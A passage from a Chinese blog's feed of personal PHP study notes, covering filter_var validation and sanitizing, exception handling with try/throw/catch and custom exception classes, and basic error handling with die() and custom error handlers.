    <content><![CDATA[<h1 id="高级过滤器"><a href="#高级过滤器" class="headerlink" title="高级过滤器"></a>高级过滤器</h1><h2 id="检测一个数字是否在一个范围内"><a href="#检测一个数字是否在一个范围内" class="headerlink" title="检测一个数字是否在一个范围内"></a>检测一个数字是否在一个范围内</h2><p>使用filter_var()函数来检测一个int型的变量是否在1到200内：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$int = <span class="number">122</span>;</span></span><br><span class="line"><span class="php">$min = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">$max = <span class="number">200</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (filter_var($int, FILTER_VALIDATE_INT, <span class="keyword">array</span>(<span class="string">"options"</span> =&gt; <span class="keyword">array</span>(<span class="string">"min_range"</span>=&gt;$min, <span class="string">"max_range"</span>=&gt;$max))) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"变量值不在合法范围内"</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"变量值在合法范围内"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">变量值在合法范围内</span><br></pre></td></tr></table></figure><br>这个地方使用了FILTER_VALIDATE_INT，这个过滤器把值作为整数来验证</p>
<p>还可以添加选项和标志</p>
<ul>
<li>min_range 规定最小整数</li>
<li>max_range 规定最大整数</li>
<li>FILTER_FLAG_ALLOW_OCTAL 允许八进制</li>
<li>FILTER_FLAG_ALLOW_HEX 允许十六进制</li>
</ul>
<p>当在数组中规定选项时，选项必须存入一个名为 “options” 的关联多维数组中</p>
<p>具体使用方法看实例</p>
<h2 id="检测IPV6地址"><a href="#检测IPV6地址" class="headerlink" title="检测IPV6地址"></a>检测IPV6地址</h2><p>依旧是使用filter_var()函数来检测$ip变量是否为IPV6地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">"2001:0db8:85a3:08d3:1319:8a2e:0370:7334"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"<span class="variable">$ip</span> 是一个 IPv6 地址"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"<span class="variable">$ip</span> 不是一个 IPv6 地址"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">2001:0db8:85a3:08d3:1319:8a2e:0370:7334 是一个<span class="built_in"> IPv6 </span>地址</span><br></pre></td></tr></table></figure></p>
<p>FILTER_VALIDATE_IP 过滤器把值作为 IP 进行验证<br>选项有</p>
<ul>
<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP</li>
<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP</li>
<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP</li>
<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内</li>
</ul>
<h2 id="检测URL"><a href="#检测URL" class="headerlink" title="检测URL"></a>检测URL</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"http://www.runoob.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filter_var(<span class="variable">$url</span>, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"<span class="variable">$url</span> 是一个合法的 URL"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"<span class="variable">$url</span> 不是一个合法的 URL"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//www.runoob.com 不是一个合法的 URL</span></span><br></pre></td></tr></table></figure><br>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证</p>
<p>标志</p>
<ul>
<li>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL（比如 <a href="http://example）" target="_blank" rel="noopener">http://example）</a></li>
<li>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（比如 <a href="http://www.example.com）" target="_blank" rel="noopener">http://www.example.com）</a></li>
<li>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在域名后存在路径（比如 www.example.com/example1/test2/）</li>
<li>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如 “example.php?name=Peter&amp;age=37”）</li>
</ul>
<h2 id="移除ASCII大于127的字符"><a href="#移除ASCII大于127的字符" class="headerlink" title="移除ASCII大于127的字符"></a>移除ASCII大于127的字符</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$str = <span class="string">"&lt;h1&gt;Hello WorldÆØÅ!&lt;/h1&gt;"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$newstr = filter_var($str, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $newstr;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure><br>FILTER_SANITIZE_STRING 过滤器去除或编码不需要的字符。</p>
<p>该过滤器删除那些对应用程序有潜在危害的数据。它用于去除标签以及删除或编码不需要的字符</p>
<ul>
<li>FILTER_FLAG_NO_ENCODE_QUOTES - 该标志不编码引号</li>
<li>FILTER_FLAG_STRIP_LOW - 去除 ASCII 值在 32 以下的字符</li>
<li>FILTER_FLAG_STRIP_HIGH - 去除 ASCII 值在 127 以上的字符</li>
<li>FILTER_FLAG_ENCODE_LOW - 编码 ASCII 值在 32 以下的字符</li>
<li>FILTER_FLAG_ENCODE_HIGH - 编码 ASCII 值在 127 以上的字符</li>
<li>FILTER_FLAG_ENCODE_AMP - 把 &amp; 字符编码为 &amp;amp</li>
</ul>
<p>更多过滤器请参考<br><a href="https://www.runoob.com/php/php-ref-filter.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-filter.html</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.涉及到过滤都使用filter_var()函数</p>
<p>2.结合简单过滤器和选项可以做到很多操作</p>
<p>3.在使用FILTER_VALIDATE_INT时，想要使用数组来作为选项，数组名必须为options</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/17-基础15</title>
    <url>/2020/07/17/PHP-2020-7-17-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>异常用于在指定的错误发生时改变脚本的正常流程</p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>PHP5提供了一种新的面向对象地错误处理方法</p>
<p>异常处理用于在指定的错误(异常)情况发生时改变脚本地正常流程。这种情况被称为异常</p>
<p>当异常被触发时:</p>
<ul>
<li>当前代码状态被保存</li>
<li>代码执行被切换到预定义的异常处理器函数</li>
<li>根据情况，处理器也许会从保存的代码状态重新开始执行代码，终止脚本执行，或从代码中另外的位置继续执行脚本</li>
</ul>
<p>错误处理方法:</p>
<ul>
<li>异常的基本使用</li>
<li>创建自定义的异常处理器</li>
<li>多个异常</li>
<li>重新抛出异常</li>
<li>设置顶层异常处理器</li>
</ul>
<p>异常只能用在错误情况下使用，而不应该被用于一个点跳到另一个点的情况</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>当异常被抛出时，其后的代码不会继续执行，PHP会尝试查找匹配的catch代码块</p>
<p>如果异常没有被捕获，而且又没用set_exception_handler()作相应处理的话，那就会发生一个致命错误，并且输出”Uncaught Exception”的错误消息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 创建一个有异常处理的函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span><span class="params">($number)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Value must be 1 or below"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 触发异常</span></span></span><br><span class="line"><span class="php">checkNum(<span class="number">2</span>);</span></span><br></pre></td></tr></table></figure>
<p>这个例子触发异常但是没去捕获它，就会得到这样的错误<br><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Exception: Value must be 1 or below in F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php:7</span><br><span class="line">Stack trace:</span><br><span class="line">#0 F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php(13): checkNum(2)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php on line 7</span><br></pre></td></tr></table></figure></p>
<h2 id="Try、throw和catch"><a href="#Try、throw和catch" class="headerlink" title="Try、throw和catch"></a>Try、throw和catch</h2><p>要避免上面实例中出现的错误，我们需要创建适当的代码来处理异常</p>
<p>适当的处理异常代码应该包括</p>
<ul>
<li>Try 使用异常的函数应该位于”try”代码块内。如果没有触发异常，则代码将照常继续执行。但是如果异常被触发，会抛出一个异常</li>
<li>Throw 里规定如何触发异常。每一个”throw”必须对应至少一个”catch”</li>
<li>Catch “catch”代码块会捕获异常，并创建一个包含异常信息的对象</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 创建一个有异常处理的函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span><span class="params">($number)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"变量值必须小于等于 1"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 在 try 块 触发异常</span></span></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    checkNum(<span class="number">2</span>);</span></span><br><span class="line"><span class="php">    <span class="comment">// 如果抛出异常，以下文本不会输出</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'如果输出该内容，说明 $number 变量'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// 捕获异常</span></span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Message: '</span> .$e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Message:</span> <span class="string">变量值必须小于等于</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="实例解释"><a href="#实例解释" class="headerlink" title="实例解释"></a>实例解释</h3><p>上面的代码解释为</p>
<ul>
<li>创建checkNum()函数。它检测数字是否大于1。如果是，则抛出一个异常</li>
<li>在”try”代码块中调用checkNum()函数</li>
<li>checkNum()函数中的异常被抛出</li>
<li>“catch”代码块接收到该异常，并创建一个包含异常信息的对象，通常为$e</li>
<li>通过从这个exception对象调用$e-&gt;getMessage()，输出来自该异常的错误信息</li>
</ul>
<h2 id="创建自定义异常"><a href="#创建自定义异常" class="headerlink" title="创建自定义异常"></a>创建自定义异常</h2><p>创建自定义的异常处理程序非常简单。简单创建一个专门的类，当发生异常时，可调用其函数。该类必须为exception类的子类</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">customException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 错误信息</span></span></span><br><span class="line"><span class="php">        $errorMsg = <span class="string">'错误行号 '</span>.<span class="keyword">$this</span>-&gt;getLine().<span class="string">' in '</span>.<span class="keyword">$this</span>-&gt;getFile()</span></span><br><span class="line"><span class="php">            .<span class="string">':'</span>.<span class="string">"\n"</span>.<span class="keyword">$this</span>-&gt;getMessage().<span class="string">' 不是一个合法的 E-Mail 地址'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $errorMsg;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$email = <span class="string">"someone@example...com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 检测邮箱</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(filter_var($email, FILTER_VALIDATE_EMAIL) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 如果是个不合法的邮箱地址，抛出异常</span></span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> customException($email);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">catch</span> (customException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//display custom message</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;errorMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="实例解释-1"><a href="#实例解释-1" class="headerlink" title="实例解释"></a>实例解释</h3><ul>
<li>该例子通过自定义的exception类来捕获异常</li>
<li>customException()类作为旧的exception类的子类，继承了exception类的所有属性和方法</li>
<li>创建errorMessage()函数。如果e-mail地址不合法，则该函数返回一条错误消息</li>
<li>把$email变量设置为不合法的e-mail地址字符串</li>
<li>执行”try”代码块，由于e-mail地址不合法，因此抛出一个异常</li>
<li>“catch”代码块捕获异常，并显示错误消息</li>
</ul>
<h2 id="多个异常"><a href="#多个异常" class="headerlink" title="多个异常"></a>多个异常</h2><p>可以为脚本使用多个异常，来检测多种情况<br>可以使用多个if…else代码块，或一个switch代码块，或者嵌套多个异常。这些异常能够使用不同的exception类，返回不同的错误信息<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">customException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 错误信息</span></span></span><br><span class="line"><span class="php">        $errorMsg = <span class="string">'错误行号 '</span>.<span class="keyword">$this</span>-&gt;getLine().<span class="string">' in '</span>.<span class="keyword">$this</span>-&gt;getFile()</span></span><br><span class="line"><span class="php">            .<span class="string">':'</span>.<span class="string">"\n"</span>.<span class="keyword">$this</span>-&gt;getMessage().<span class="string">' 不是一个合法的 E-Mail 地址'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $errorMsg;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$email = <span class="string">"someone@example@.com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 检测邮箱</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(filter_var($email, FILTER_VALIDATE_EMAIL) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 如果是个不合法的邮箱地址，抛出异常</span></span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> customException($email);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="comment">// 检测 "example" 是否在邮箱地址中</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strpos($email, <span class="string">"example"</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"$email 是 example 邮箱"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span> (customException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;errorMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>基本与上个例子一致，不过是使用了判断语句和多个catch来实现了多异常的处理</p>
<h2 id="重新抛出异常"><a href="#重新抛出异常" class="headerlink" title="重新抛出异常"></a>重新抛出异常</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">customException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 错误信息</span></span></span><br><span class="line"><span class="php">        $errorMsg = <span class="keyword">$this</span>-&gt;getMessage().<span class="string">' 不是一个合法的 E-Mail 地址。'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $errorMsg;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$email = <span class="string">"someone@exampl.com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">try</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 检测 "example" 是否在邮箱地址中</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(strpos($email, <span class="string">"example"</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// 如果是个不合法的邮箱地址，抛出异常</span></span></span><br><span class="line"><span class="php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>($email);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 重新抛出异常</span></span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> customException($email);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span> (customException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 显示自定义信息</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;errorMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>有时候，当异常被抛出时，希望以不同于标准的方式处理，就可以套娃</p>
<p>与上面例子几乎无异，不解释了</p>
<h2 id="设置顶层异常处理器"><a href="#设置顶层异常处理器" class="headerlink" title="设置顶层异常处理器"></a>设置顶层异常处理器</h2><p>set_exception_handler() 函数可设置处理所有未捕获异常的用户定义函数</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myException</span><span class="params">($exception)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Exception: "</span> , $exception-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">set_exception_handler(<span class="string">'myException'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Uncaught Exception occurred'</span>);</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Exception</span>: Uncaught <span class="keyword">Exception</span> occurred</span><br></pre></td></tr></table></figure><br>上面不存在catch代码块，而是触发顶层的异常处理程序。应该使用此函数来捕获所有未捕获的异常</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.需要进行异常处理的代码必须放入try代码块中，以便捕获潜在的异常</p>
<p>2.每个try或throw代码块必须至少拥有一个对应的catch代码块</p>
<p>3.使用多个catch代码块可以捕获不同种类的异常</p>
<p>4.可以在try代码块内的catch代码块中抛出或再次抛出异常</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/16-基础14</title>
    <url>/2020/07/16/PHP-2020-7-16-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>在PHP中，默认的错误处理很简单。一条错误消息会被发送到浏览器，这条消息带有文件名、行号以及描述错误的消息</p>
<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>在创建脚本和Web应用程序时，错误处理是一个很重要的部分，如果你的代码缺少错误检测编码，那么程序就很不专业</p>
<p>错误处理方法为</p>
<ul>
<li>简单的”die()”语句</li>
<li>自定义错误和错误触发器</li>
<li>错误报告</li>
</ul>
<h2 id="die-函数"><a href="#die-函数" class="headerlink" title="die()函数"></a>die()函数</h2><p>打开文本文件<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span></span><br></pre></td></tr></table></figure><br>如果文件不存在就会得到类似错误<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Warning: fopen(welcome.txt) [function.fopen]: failed to <span class="keyword">open</span> stream:</span><br><span class="line"><span class="keyword">No</span> such <span class="keyword">file</span> or directory <span class="keyword">in</span> /www/runoob/<span class="keyword">test</span>/<span class="keyword">test</span>.php <span class="keyword">on</span> <span class="keyword">line</span> 2</span><br></pre></td></tr></table></figure></p>
<p>为了避免以上错误，访问之前检测该文件是否存在<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!file_exists(<span class="string">"welcome.txt"</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"文件不存在"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件不存在</span><br></pre></td></tr></table></figure></p>
<h2 id="自定义错误处理器"><a href="#自定义错误处理器" class="headerlink" title="自定义错误处理器"></a>自定义错误处理器</h2><p>创建自定义的错误处理器非常多，很简单地创建一个专用函数，可以在PHP中发生错误时调用该函数</p>
<p>该函数必须要有能力处理两个参数(error level和eroor message)，可以最多接受五个参数</p>
<p>语法<br><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">error_function(<span class="name">error_level</span>,error_message,</span><br><span class="line">error_file,error_line,error_context)</span><br></pre></td></tr></table></figure><br>参数 | 描述</p>
<ul>
<li>| -<br>error_level | 必需。为用户定义的错误规定错误报告级别。必须是一个数字。<br>error_message | 必需。为用户定义的错误规定错误信息<br>error_file | 可选。规定错误发生的文件名<br>error_line | 可选。规定错误发生的行号<br>error_context | 可选。规定一个数组，包含了当错误发生时在用的每个变量以及它们的值</li>
</ul>
<h2 id="错误报告级别"><a href="#错误报告级别" class="headerlink" title="错误报告级别"></a>错误报告级别</h2><p>用户自定义的错误处理程序处理的不同类型的错误</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>值</th>
<th>常量</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>2</td>
<td>E_WARNING</td>
<td>非致命的run-time错误。不暂停脚本执行</td>
</tr>
<tr>
<td>8</td>
<td>E_NOTICE</td>
<td>run-time通知。在脚本发现可能有错误时发生，但也可能在脚本正常运行时发生</td>
</tr>
<tr>
<td>256</td>
<td>E_USER_ERROR</td>
<td>致命的用户生成的错误。这类似于程序员使用PHP函数trigger_error()设置的E_ERROR</td>
</tr>
<tr>
<td>512</td>
<td>E_USER_WARNING</td>
<td>非致命的用户生成的警告。这类似于程序员使用PHP函数trigger_error()设置的E_WARNING</td>
</tr>
<tr>
<td>1024</td>
<td>E_USER_NOTICE</td>
<td>用户生成的通知。这类似于程序员使用PHP函数trigger_error()设置的E_NOTICE</td>
</tr>
<tr>
<td>4096</td>
<td>E_RECOVERABLE_ERROR</td>
<td>可捕获的致命错误。类似E_ERROR,但可被用户定义的处理程序捕获</td>
</tr>
<tr>
<td>8191</td>
<td>E_ALL</td>
<td>所有错误和警告</td>
</tr>
</tbody>
</table>
</div>
<p>现在创建一个处理错误的函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"脚本结束"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><br>上面的代码就是一个简单的错误处理函数，当它被触发时，它会取得错误级别和错误消息。然后它会输出错误级别和消息，并终止脚本</p>
